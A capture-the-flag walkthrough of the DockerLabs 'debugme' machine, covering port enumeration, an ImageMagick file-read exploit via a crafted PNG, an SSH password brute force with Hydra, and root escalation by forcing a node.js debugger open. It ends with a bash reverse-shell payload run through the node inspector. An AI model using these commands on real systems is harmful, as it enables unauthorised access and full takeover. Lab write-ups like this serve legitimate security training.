This cybersecurity challenge, available on <a target="_blank" href="https://dockerlabs.es">DockerLabs</a> (El PingÃ¼ino de Mario), guides participants through a server intrusion. The process involves service enumeration, exploiting an LFI vulnerability, gaining SSH access via brute force, and escalating privileges through a node.js process to achieve root access. 

## Table of contents

## Enumeration

```bash
nmap -p- 172.17.0.2 -n -P
```

![nmap all ports](/assets/debugme/image-1.png)

```bash
nmap -p22,80,443 -sVC -n -Pn 172.17.0.2
```

![nmap ports 22, 80 and 443](/assets/debugme/image.png)

We visit the website on ports 80 and 443, and the same page appears. It seems to be a tool where we can select an image and the different size versions we want for the image.

![Resize image](/assets/debugme/image-2.png)

When submitting the form with an image and different versions, it shows them on a page.

![Result](/assets/debugme/image-3.png)

We do a bit of fuzzing on the web service using gobuster.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/ -x py,php,txt,db,htm,html,back -t 50 -k
```

We find the classic info.php, with PHP information.

![gobuster](/assets/debugme/image-4.png)

In `/info.php`, we find a bunch of installed PHP extensions and a slightly outdated PHP version `PHP Version 7.2.24-0ubuntu0.18.04.3`.

We also see that the `GD` and `Image Magick` modules are installed, which may be used for the image transformation service.

## Intrusion

There are likely different ways to perform the intrusion; in this case, we opted for a possible LFI (I think this would be LFI, but I'm not sure) that occurs during ImageMagick transformation.

More information at:

- https://www.hackplayers.com/2023/02/imagemagick-la-vulnerabilidad-oculta.html

### LFI

Following the instructions from hackplayers, we install the necessary dependencies:

```bash
sudo apt install pngcrush imagemagick exiftool exiv2 -y
```

We use a PNG and add the profile field with the path we want to inject. This will create the pngout.png file.

![pngcrush](/assets/debugme/image-5.png)

We check that it has been added correctly.

```bash
exiv2 -pS pngout.png
```

![alt text](/assets/debugme/image-6.png)

Now we use the pngout.png image in the web service, select a size, and click on "Resize".

![Resize payload](/assets/debugme/image-7.png)

The two images appear, we right-click on one and download it to our Kali, naming it resultado.png.

![alt text](/assets/debugme/image-8.png)

We check if the data has leaked in the profile.

```bash
identify -verbose resultado.png
```

![alt text](/assets/debugme/image-9.png)

It seems the data leaked correctly. We copy all the hexadecimal bytes from the profile and put them in a single line. Then, we include them in the following Python:

```bash
python3 -c 'print(bytes.fromhex("BYTES_IN_HEX").decode("utf-8"))'
```

And the result:

![alt text](/assets/debugme/image-10.png)

Great, we now have an LFI, and we can see that there is a user named `lenam` and another named `application`.

### SSH Brute Force

If we try to look for other interesting files, we don't find anything. We attempt a brute force attack with the user `lenam` using Hydra.

```bash
hydra 172.17.0.2 ssh -t 64 -l lenam -P /usr/share/wordlists/rockyou.txt -f -vV
```

With a little patience, we find the SSH password for the user lenam.

![lenam ssh password](/assets/debugme/image-11.png)

## Privilege Escalation

We access via SSH using the user `lenam` and the password `loverboy`.

![alt text](/assets/debugme/image-12.png)

We see that we can run the command `/bin/kill` as root with lenam's password.

We also look at the processes that root is running and observe that a node.js process is being executed.

```bash
ps aux | grep root
```

![processes](/assets/debugme/image-13.png)

We check if there are any open local ports and find ports 8000 and 9000.

```bash
netstat -ano | grep LISTEN
```

![ports](/assets/debugme/image-14.png)

Port 8000 seems to be a node.js application.

```bash
curl 127.0.0.1:8000
```

![alt text](/assets/debugme/image-15.png)

Since we can kill any process, we try to open the node.js debugger by sending a `SIGUSR1` signal to the node.js process. This should restart the node.js application with the debug port open (by default, port 9229) and accessible via websockets.

More information:

- https://nodejs.org/en/learn/getting-started/debugging
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse#starting-inspector-in-running-processes

To obtain the PID of the node.js process:

```bash
ps aux | grep node | grep root | awk '{print $2}'
```

The complete command:

```bash
sudo /bin/kill -s SIGUSR1 $(ps aux | grep node | grep root | awk '{print $2}')
```

We check if the debug and inspection port 9229 is now open.

![port 9229](/assets/debugme/image-16.png)

Bingo! It worked. Now we enter the node.js application with the inspector.

```bash
node inspect 127.0.0.1:9229
```

![nodejs inspect](/assets/debugme/image-17.png)

We listen with netcat.

```bash
nc -lvnp 5000
```

And we execute the following payload in the debug console, replacing the IP 10.0.2.15 with yours.

```javascript
exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/10.0.2.15/5000 0>&1\"')")
```

Congratulations, we are now root.
